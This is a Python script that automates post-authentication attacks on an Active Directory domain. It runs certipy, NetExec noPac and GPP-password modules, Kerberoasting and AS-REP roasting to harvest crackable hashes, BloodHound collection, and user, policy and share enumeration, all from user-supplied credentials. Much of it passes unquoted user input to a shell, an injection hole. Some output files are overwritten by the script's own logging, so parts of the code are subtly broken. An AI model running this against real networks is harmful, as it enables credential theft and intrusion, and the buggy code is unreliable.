import os
import subprocess
def run_command(command, output_file):
    """
    Run a shell command and save its output to a file.
    """
    with open(output_file, 'w') as file:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        file.write(result.stdout)
        file.write(result.stderr)
def search_in_file(file_path, search_term):
    """
    Search for a specific term in a file.
    """
    with open(file_path, 'r') as file:
        for line in file:
            if search_term in line:
                return True
    return False
def main():
    # Input from user
    username = input("Enter the username: ")
    password = input("Enter the password: ")
    targets = input("Enter the targets file: ")
    domain_controller_ip = input("Enter the Domain Controller IP: ")
    dcs = input("Enter file to the DC IPs: ")
    domain = input("Enter the Domain name: ")
    # Directory to store output files
    output_dir = "auth_enum"
    os.makedirs(output_dir, exist_ok=True)
    # Commands to be executed
    commands = [
        f"certipy find -u '{username}@{domain}' -p '{password}' -dc-ip {domain_controller_ip} -scheme ldap",
        f"nxc smb {dcs} -u {username} -p '{password}' -M nopac",
        f"nxc smb {dcs} -u {username} -p '{password}' -M gpp_autologin",
        f"nxc smb {dcs} -u {username} -p '{password}' -M gpp_password",
        f"GetUserSPNs.py {domain}/{username}:'{password}' -dc-ip {domain_controller_ip} -request -outputfile {output_dir}/kerb.txt",
        f"GetNPUsers.py {domain}/{username}:'{password}' -dc-ip {domain_controller_ip} -outputfile {output_dir}/asrep.txt",
        f"bloodhound-python -c All,LoggedOn --zip -u {username} -p '{password}' -d {domain}",
        f"nxc smb {domain_controller_ip} -u {username} -p '{password}' --users",
        f"nxc smb {domain_controller_ip} -u {username} -p '{password}' --pass-pol",
        f"nxc smb {targets} -u {username} -p '{password}' --shares"
    ]
    # Output files corresponding to the commands
    output_files = [
        f"{output_dir}/certipy.txt",
        f"{output_dir}/nopac.txt",
        f"{output_dir}/gpp_autologin.txt",
        f"{output_dir}/gpp_password.txt",
        f"{output_dir}/kerb.txt",
        f"{output_dir}/asrep.txt",
        f"{output_dir}/bloodhound.zip",
        f"{output_dir}/ad_users.txt",
        f"{output_dir}/passpol.txt",
        f"{output_dir}/shares.txt"
    ]
    # Execute each command and store the output
    for command, output_file in zip(commands, output_files):
        print(f"Running command: {command}")
        run_command(command, output_file)
        print(f"Output stored in: {output_file}")
    # Search for vulnerabilities in certipy.txt
    certipy_file = f"{output_dir}/certipy.txt"
    if search_in_file(certipy_file, "vulnerabilities"):
        print("Certipy vulnerability found. Review certipy output.")
if __name__ == "__main__":
    main()
